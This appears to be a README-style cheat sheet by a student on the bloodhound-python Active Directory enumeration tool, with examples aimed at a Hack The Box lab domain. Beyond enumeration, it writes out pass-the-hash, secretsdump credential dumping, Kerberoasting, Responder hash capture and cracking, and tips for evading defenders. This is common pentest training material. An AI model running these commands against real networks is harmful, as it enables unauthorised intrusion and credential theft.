<!-- CYBERPUNK HEADER -->
<div align="center">

```
╔══════════════════════════════════════════════════════════════════════════════╗
║  ██████╗ ██╗      ██████╗  ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗  ║
║  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗ ║
║  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║ ║
║  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║ ║
║  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝ ║
║  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝  ║
║                                                                              ║
║                   🐍 [ PYTHON INGESTOR ] 🐍                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

<!-- BADGES -->
![Tool](https://img.shields.io/badge/TOOL-BloodHound--Python-red?style=for-the-badge&logo=python&logoColor=white)
![Active Directory](https://img.shields.io/badge/ACTIVE_DIRECTORY-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)
![Enumeration](https://img.shields.io/badge/ENUMERATION-00FF00?style=for-the-badge&logo=hackthebox&logoColor=black)

[![Author](https://img.shields.io/badge/Author-0xNetrunner-00FF00?style=flat-square&logo=github)](https://github.com/00xNetrunner)
![Category](https://img.shields.io/badge/Category-AD_Recon-purple?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Linux-orange?style=flat-square)

</div>

---

> **`[SYSTEM]`** Remote Active Directory enumeration ingestor for BloodHound
>
> **`[STATUS]`** Module: `LOADED` | Target: `DOMAIN` | Protocol: `LDAP`

---

## 📋 >_ Table.Of.Contents()

- [Overview](#-overview)
- [Installation](#-installation)
- [Basic Usage](#-basic-usage)
- [Authentication Methods](#-authentication-methods)
- [Collection Methods](#-collection-methods)
- [Advanced Options](#-advanced-options)
- [Output Options](#-output-options)
- [Common Usage Scenarios](#-common-usage-scenarios)
- [SharpHound Comparison](#-sharphound-comparison)
- [Troubleshooting](#-troubleshooting)
- [Post-Collection](#-post-collection)

---

## 🎯 Overview

```
> Loading module: BloodHound_Python.dll...
> Initializing remote LDAP ingestor...
> Status: READY
```

**bloodhound-python** (also known as **BloodHound.py**) is a Python-based ingestor for BloodHound that allows remote data collection from Active Directory environments without needing to execute code on Windows systems.

### ⚡ Key Features

```
[✓] Remote enumeration from Linux
[✓] No code execution on target required
[✓] LDAP-based collection
[✓] Multiple authentication methods
[✓] Kerberos support
[✓] Outputs JSON files for BloodHound
```

### 🆚 When to Use bloodhound-python vs SharpHound

| Scenario | Tool |
|:---------|:-----|
| Have valid AD credentials, attacking from Linux | **bloodhound-python** |
| Have shell access on Windows machine | **SharpHound** |
| Need session enumeration | **SharpHound** |
| Remote enumeration only | **bloodhound-python** |
| Need local admin rights detection | **SharpHound** |
| Stealth is priority (no Windows execution) | **bloodhound-python** |

---

## 📦 Installation

### 🐧 Kali Linux (Pre-installed)

```bash
# Usually pre-installed on Kali
bloodhound-python --help

# If not installed
sudo apt update
sudo apt install bloodhound.py
```

### 🔧 Manual Installation (pip)

```bash
# Install via pip
pip3 install bloodhound

# Or install from GitHub (latest version)
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
pip3 install .

# Verify installation
bloodhound-python --version
```

### 📚 Dependencies

```bash
# Required dependencies
pip3 install dnspython ldap3 impacket

# For Kerberos support
sudo apt install krb5-user
pip3 install pyasn1 pyasn1-modules
```

---

## 🚀 Basic Usage

### Standard Execution

```bash
# Basic enumeration with all collection methods
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41

# With automatic ZIP creation
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip

# Specify output directory
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 -o /tmp/bloodhound

# Custom collection name
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --collectionmethod all
```

### 📊 Essential Parameters

| Parameter | Description | Example |
|:----------|:------------|:--------|
| `-c, --collectionmethod` | Collection method(s) | `-c all` |
| `-u, --username` | Username | `-u judith.mader` |
| `-p, --password` | Password | `-p judith09` |
| `-d, --domain` | Domain name | `-d certified.htb` |
| `-ns, --nameserver` | Domain Controller IP | `-ns 10.10.11.41` |
| `-dc, --domain-controller` | DC hostname | `-dc DC01.certified.htb` |

---

## 🔐 Authentication Methods

### 🔓 Method 1: Username & Password

```bash
# Basic password authentication
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41

# With domain prefix
bloodhound-python -c all -u certified.htb/judith.mader -p judith09 -ns 10.10.11.41

# Using domain\username format
bloodhound-python -c all -u 'certified.htb\judith.mader' -p judith09 -ns 10.10.11.41
```

### 🔐 Method 2: NTLM Hash (Pass-the-Hash)

```bash
# Using NTLM hash
bloodhound-python -c all -u judith.mader --hashes :8846f7eaee8fb117ad06bdd830b7586c -d certified.htb -ns 10.10.11.41

# With LM hash (usually empty)
bloodhound-python -c all -u judith.mader --hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -d certified.htb -ns 10.10.11.41

# From secretsdump output
bloodhound-python -c all -u administrator --hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 -d certified.htb -ns 10.10.11.41
```

### 🎫 Method 3: Kerberos Authentication

```bash
# Using Kerberos ticket
bloodhound-python -c all -u judith.mader -d certified.htb -ns 10.10.11.41 -k

# With ticket cache
export KRB5CCNAME=/tmp/judith.ccache
bloodhound-python -c all -u judith.mader -d certified.htb -ns 10.10.11.41 -k --kerberos

# Using AES key
bloodhound-python -c all -u judith.mader -d certified.htb -ns 10.10.11.41 --aesKey <aes_key>
```

### 📜 Method 4: No Password (with .ccache file)

```bash
# Set Kerberos ticket cache
export KRB5CCNAME=/tmp/krb5cc_judith.mader

# Run without password
bloodhound-python -c all -u judith.mader -d certified.htb -ns 10.10.11.41 -k --no-pass
```

### 🔒 Method 5: Interactive Password Prompt

```bash
# Prompt for password (more secure, no password in bash history)
bloodhound-python -c all -u judith.mader -d certified.htb -ns 10.10.11.41
# Will prompt: Password:
```

---

## 🎯 Collection Methods

### Available Collection Methods

| Method | Description | What It Collects |
|:-------|:------------|:-----------------|
| **all** | All collection methods | Everything below |
| **group** | Group memberships | Groups and members |
| **localadmin** | Local admin rights | Local admin relationships |
| **session** | User sessions | Logged on users |
| **trusts** | Domain trusts | Trust relationships |
| **default** | Default safe methods | Group, LocalAdmin, Session, Trusts |
| **container** | Container info | OUs and Containers |
| **psremote** | PSRemote rights | PowerShell remoting access |
| **dcom** | DCOM rights | DCOM execution rights |
| **rdp** | RDP rights | Remote Desktop access |
| **objectprops** | Object properties | Additional AD object properties |
| **acl** | ACL enumeration | Access Control Lists |
| **loggedon** | Logged on users | Currently logged on users |

### Collection Method Usage

```bash
# All methods (most comprehensive)
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41

# Default methods only
bloodhound-python -c default -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41

# Specific single method
bloodhound-python -c group -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41

# Multiple specific methods
bloodhound-python -c group,acl,trusts -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41

# All except sessions (less noisy)
bloodhound-python -c group,localadmin,trusts,acl,container,objectprops -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41
```

### ⚡ Method Comparison

```bash
# Quick enumeration (fastest)
bloodhound-python -c group,trusts -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41

# Comprehensive enumeration (slower but complete)
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41

# Stealth enumeration (LDAP only, no SMB)
bloodhound-python -c group,acl,objectprops,container,trusts -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41
```

---

## ⚙️ Advanced Options

### Domain Controller Specification

```bash
# Using IP address (nameserver)
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41

# Using hostname (domain controller)
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -dc dc01.certified.htb

# Using FQDN
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -dc dc01.certified.htb -ns 10.10.11.41

# Multiple DCs (will try in order)
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41,10.10.11.42
```

### LDAP Configuration

```bash
# Specify LDAP port (default: 389)
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --ldapport 389

# Use LDAPS (secure LDAP, port 636)
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --ldapport 636

# Use Global Catalog port
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --ldapport 3268

# Use GC-SSL
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --ldapport 3269

# Disable certificate verification (LDAPS)
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --ldapport 636 --disable-signing
```

### DNS Configuration

```bash
# Use custom DNS server
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --dns-tcp

# Force TCP for DNS queries
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --dns-tcp

# Specify DNS timeout
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --dns-timeout 5
```

### Global Catalog Options

```bash
# Use Global Catalog for queries
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --global-catalog

# Specify GC hostname
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --gc dc01.certified.htb
```

### Computer/Host Enumeration

```bash
# Exclude domain controllers from enumeration
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --exclude-dcs

# Custom computer filter (LDAP filter)
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --computerfilter "(operatingSystem=*Server*)"

# Disable computer enumeration (LDAP only)
bloodhound-python -c group,acl -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41
```

---

## 📁 Output Options

### Output Directory & Files

```bash
# Default output (current directory)
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41

# Custom output directory
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 -o /tmp/bloodhound_data

# Specific output directory with ZIP
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 -o /tmp/bh --zip
```

### ZIP File Creation

```bash
# Automatically create ZIP file
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip

# ZIP file will be named: YYYYMMDDHHMMSS_bloodhound.zip
```

### Output Files Generated

**Without `--zip`:**
```
20241127163045_computers.json
20241127163045_users.json
20241127163045_groups.json
20241127163045_domains.json
20241127163045_gpos.json
20241127163045_ous.json
20241127163045_containers.json
```

**With `--zip`:**
```
20241127163045_bloodhound.zip (contains all JSON files)
```

---

## 🔥 Common Usage Scenarios

### Scenario 1: Initial Domain Enumeration

```bash
# Quick initial recon
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip

# Save to specific location
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 -o ~/htb/certified/bloodhound --zip
```

### Scenario 2: Stealth Enumeration (LDAP Only)

```bash
# No SMB connections, LDAP queries only
bloodhound-python -c group,acl,objectprops,trusts -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip

# Minimize queries
bloodhound-python -c group,trusts -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip
```

### Scenario 3: After Obtaining Hash

```bash
# Pass-the-hash attack
bloodhound-python -c all -u administrator --hashes :32693b11e6aa90eb43d32c72a07ceea6 -d certified.htb -ns 10.10.11.41 --zip

# After secretsdump
impacket-secretsdump certified.htb/judith.mader:judith09@10.10.11.41
# Use extracted hash
bloodhound-python -c all -u administrator --hashes :32693b11e6aa90eb43d32c72a07ceea6 -d certified.htb -ns 10.10.11.41 --zip
```

### Scenario 4: Multi-Domain Environment

```bash
# Enumerate parent domain
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip

# Enumerate child domain
bloodhound-python -c all -u judith.mader -p judith09 -d child.certified.htb -ns 10.10.11.42 --zip

# Enumerate trusted domain (if creds work)
bloodhound-python -c all -u judith.mader -p judith09 -d external.local -ns 10.10.11.50 --zip
```

### Scenario 5: Kerberos Authentication

```bash
# Get TGT first
impacket-getTGT certified.htb/judith.mader:judith09

# Set ticket cache
export KRB5CCNAME=/tmp/judith.mader.ccache

# Run bloodhound with Kerberos
bloodhound-python -c all -u judith.mader -d certified.htb -ns 10.10.11.41 -k --no-pass --zip
```

### Scenario 6: Through SOCKS Proxy

```bash
# Set up proxy (e.g., with chisel)
export HTTP_PROXY=socks5://127.0.0.1:1080
export HTTPS_PROXY=socks5://127.0.0.1:1080

# Or use proxychains
proxychains bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip
```

### Scenario 7: Limited User Permissions

```bash
# Low-privilege user - collect what you can
bloodhound-python -c group,trusts -u lowpriv -p password123 -d certified.htb -ns 10.10.11.41 --zip

# Check for interesting group memberships and trusts
```

---

## 🆚 SharpHound Comparison

### Feature Comparison

| Feature | bloodhound-python | SharpHound |
|:--------|:-----------------|:-----------|
| **Platform** | Linux/Remote | Windows/Local |
| **Execution** | No code on target | Runs on target |
| **Sessions** | ❌ Limited | ✅ Full |
| **Local Admin** | ⚠️ Via LDAP | ✅ Direct query |
| **LDAP Data** | ✅ Full | ✅ Full |
| **Groups** | ✅ Full | ✅ Full |
| **ACLs** | ✅ Full | ✅ Full |
| **GPOs** | ✅ Full | ✅ Full |
| **Stealth** | ✅ Better | ⚠️ More noisy |
| **Speed** | ⚠️ Slower | ✅ Faster |

### Command Comparison

**bloodhound-python:**
```bash
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip
```

**SharpHound equivalent (on Windows as judith.mader):**
```powershell
.\SharpHound.exe -c All -d certified.htb --domaincontroller 10.10.11.41
```

### When to Use Each

**Use bloodhound-python when:**
```
[✓] You have valid credentials but no Windows access
[✓] You want to enumerate remotely from Linux
[✓] You need stealth (no code execution on target)
[✓] You're doing initial reconnaissance
```

**Use SharpHound when:**
```
[✓] You have shell access on Windows
[✓] You need session enumeration
[✓] You need local admin detection
[✓] You want faster/more complete enumeration
```

---

## 🐛 Troubleshooting

### Common Errors & Solutions

#### Error: "Could not resolve domain"

```bash
# Solution 1: Add to /etc/hosts
echo "10.10.11.41 certified.htb dc01.certified.htb" | sudo tee -a /etc/hosts

# Solution 2: Use IP instead of hostname
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41

# Solution 3: Use DC hostname
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -dc dc01.certified.htb -ns 10.10.11.41
```

#### Error: "Authentication failed"

```bash
# Check credentials
crackmapexec smb 10.10.11.41 -u judith.mader -p judith09 -d certified.htb

# Try different username formats
bloodhound-python -c all -u 'certified.htb\judith.mader' -p judith09 -ns 10.10.11.41
bloodhound-python -c all -u judith.mader@certified.htb -p judith09 -ns 10.10.11.41
bloodhound-python -c all -u certified.htb/judith.mader -p judith09 -ns 10.10.11.41

# Check for account lockout
crackmapexec ldap 10.10.11.41 -u judith.mader -p judith09 -d certified.htb
```

#### Error: "LDAP connection failed"

```bash
# Try different LDAP port
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --ldapport 389

# Try LDAPS
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --ldapport 636

# Disable signing
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --disable-signing

# Check connectivity
nmap -p 389,636,3268,3269 10.10.11.41
```

#### Error: "DNS resolution failed"

```bash
# Add DNS server to /etc/resolv.conf
echo "nameserver 10.10.11.41" | sudo tee /etc/resolv.conf

# Use --dns-tcp
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --dns-tcp

# Add domain to /etc/hosts
echo "10.10.11.41 certified.htb" | sudo tee -a /etc/hosts
```

#### Error: "No output generated"

```bash
# Check permissions
ls -la /tmp

# Specify output directory
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 -o /tmp/bh

# Check for errors in output
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 -v
```

#### Error: "Kerberos authentication failed"

```bash
# Check KRB5CCNAME
echo $KRB5CCNAME

# Verify ticket
klist

# Get fresh ticket
impacket-getTGT certified.htb/judith.mader:judith09 -dc-ip 10.10.11.41

# Set correct ticket path
export KRB5CCNAME=/tmp/judith.mader.ccache

# Configure /etc/krb5.conf
sudo nano /etc/krb5.conf
```

#### Error: "Module not found"

```bash
# Install dependencies
pip3 install bloodhound dnspython ldap3 impacket

# Or reinstall
pip3 install --upgrade bloodhound

# Check Python path
which python3
python3 -m site
```

---

## 📊 Post-Collection

### Verify Output Files

```bash
# Check generated files
ls -lh *bloodhound* *_*.json

# Verify JSON files
for file in *.json; do
    echo "Checking $file"
    jq empty "$file" && echo "✓ Valid JSON" || echo "✗ Invalid JSON"
done

# Count objects in files
echo "Users: $(jq '.users | length' *_users.json)"
echo "Groups: $(jq '.groups | length' *_groups.json)"
echo "Computers: $(jq '.computers | length' *_computers.json)"
```

### Import to BloodHound

```bash
# Start Neo4j
sudo neo4j start

# Start BloodHound GUI
bloodhound

# Or use bloodhound-import (if available)
bloodhound-import -f 20241127163045_bloodhound.zip
```

### Manual ZIP Creation (if needed)

```bash
# Create ZIP manually
zip bloodhound_certified.zip *_computers.json *_users.json *_groups.json *_domains.json *_gpos.json *_ous.json *_containers.json

# Or use tar
tar -czf bloodhound_certified.tar.gz *_*.json
```

### Clean Up

```bash
# Remove individual JSON files (keep ZIP)
rm *_computers.json *_users.json *_groups.json *_domains.json *_gpos.json *_ous.json *_containers.json

# Remove all BloodHound files
rm -f *bloodhound* *_*.json
```

---

## 🎓 Advanced Techniques

### Combining with Other Tools

```bash
# 1. Enumerate domain users first
crackmapexec ldap 10.10.11.41 -u judith.mader -p judith09 -d certified.htb --users

# 2. Run BloodHound
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip

# 3. Enumerate shares
crackmapexec smb 10.10.11.41 -u judith.mader -p judith09 -d certified.htb --shares

# 4. Check for AS-REP roasting
impacket-GetNPUsers certified.htb/judith.mader:judith09 -dc-ip 10.10.11.41 -request

# 5. Kerberoasting
impacket-GetUserSPNs certified.htb/judith.mader:judith09 -dc-ip 10.10.11.41 -request
```

### Automation Script

```bash
#!/bin/bash
# bloodhound_auto.sh

DOMAIN="certified.htb"
DC_IP="10.10.11.41"
USERNAME="judith.mader"
PASSWORD="judith09"
OUTPUT_DIR="/tmp/bloodhound_$(date +%Y%m%d_%H%M%S)"

echo "[+] Creating output directory: $OUTPUT_DIR"
mkdir -p "$OUTPUT_DIR"

echo "[+] Running BloodHound collection..."
bloodhound-python -c all \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -d "$DOMAIN" \
    -ns "$DC_IP" \
    -o "$OUTPUT_DIR" \
    --zip

echo "[+] Collection complete!"
echo "[+] Output saved to: $OUTPUT_DIR"
ls -lh "$OUTPUT_DIR"
```

### Using with Responder/LLMNR Poisoning

```bash
# 1. Capture credentials with Responder
sudo responder -I tun0 -wv

# 2. Wait for credentials...
# [+] Captured NTLMv2 hash: user::domain:hash...

# 3. Crack the hash
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt

# 4. Use credentials with BloodHound
bloodhound-python -c all -u captured_user -p cracked_pass -d certified.htb -ns 10.10.11.41 --zip
```

---

## 💡 Pro Tips

```
[01] Always use --zip - Makes import to BloodHound cleaner
[02] Start with 'all' collection - Get complete picture first
[03] Save output to organized directories - Use timestamps and target names
[04] Add domains to /etc/hosts - Prevents DNS issues
[05] Use pass-the-hash when possible - Don't crack if you don't need to
[06] Combine with other tools - CME, Impacket suite for comprehensive recon
[07] Run multiple times - User sessions change, run during business hours
[08] Document your findings - Keep track of credentials and paths found
[09] Use --exclude-dcs for stealth - Reduces queries to domain controllers
[10] Verify JSON validity - Check files before importing to BloodHound
```

---

## ⚠️ Operational Security

### Stealth Considerations

```bash
# Minimal queries (stealthy)
bloodhound-python -c group,trusts -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip

# Avoid computer enumeration (no SMB connections)
bloodhound-python -c group,acl,trusts -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip

# Use LDAPS for encryption
bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --ldapport 636 --zip
```

### Detection Considerations

**What defenders might see:**
```
[!] LDAP queries from unusual source
[!] Multiple LDAP binds in short time
[!] Queries for sensitive attributes (adminCount, etc.)
[!] SMB connections for session enumeration
```

**Mitigation:**
```
[→] Use compromised internal system as jump box
[→] Spread out collection over time
[→] Use legitimate admin account if possible
[→] Consider using SharpHound on compromised Windows box instead
```

---

## 🔗 Useful Resources

| Resource | URL |
|:---------|:----|
| 🔗 BloodHound.py GitHub | https://github.com/fox-it/BloodHound.py |
| 📖 BloodHound Documentation | https://bloodhound.readthedocs.io/ |
| 💻 BloodHound GUI | https://github.com/BloodHoundAD/BloodHound |
| 🔍 Custom Cypher Queries | https://github.com/hausec/Bloodhound-Custom-Queries |

---

## 📝 Quick Reference Card

```bash
# Standard enumeration
bloodhound-python -c all -u USER -p PASS -d DOMAIN -ns DC_IP --zip

# With hash
bloodhound-python -c all -u USER --hashes :NTHASH -d DOMAIN -ns DC_IP --zip

# With Kerberos
export KRB5CCNAME=/tmp/ticket.ccache
bloodhound-python -c all -u USER -d DOMAIN -ns DC_IP -k --no-pass --zip

# Stealth mode
bloodhound-python -c group,acl,trusts -u USER -p PASS -d DOMAIN -ns DC_IP --zip

# Custom output
bloodhound-python -c all -u USER -p PASS -d DOMAIN -ns DC_IP -o /tmp/bh --zip

# Through proxy
proxychains bloodhound-python -c all -u USER -p PASS -d DOMAIN -ns DC_IP --zip
```

---

<div align="center">

## 👤 >_ Author.Info()

```
╔══════════════════════════════════════════════════════════════╗
║                     [ NETRUNNER PROFILE ]                    ║
╠══════════════════════════════════════════════════════════════╣
║  HANDLE      :  0xNetrunner                                  ║
║  CLASS       :  4th Year Ethical Hacking Student             ║
║  SPECIALTY   :  Active Directory | Penetration Testing       ║
║  STATUS      :  Active                                       ║
╚══════════════════════════════════════════════════════════════╝
```

[![GitHub](https://img.shields.io/badge/GitHub-0xNetrunner-181717?style=for-the-badge&logo=github)](https://github.com/00xNetrunner)

---

```
╔═══════════════════════════════════════════════════════════════╗
║                  [ END OF TRANSMISSION ]                      ║
║                    HACK THE PLANET! 🌐                        ║
╚═══════════════════════════════════════════════════════════════╝
```

![BloodHound](https://img.shields.io/badge/TOOL-BloodHound--Python-red?style=flat-square)
![AD Enumeration](https://img.shields.io/badge/AD-ENUMERATION-blue?style=flat-square)

</div>
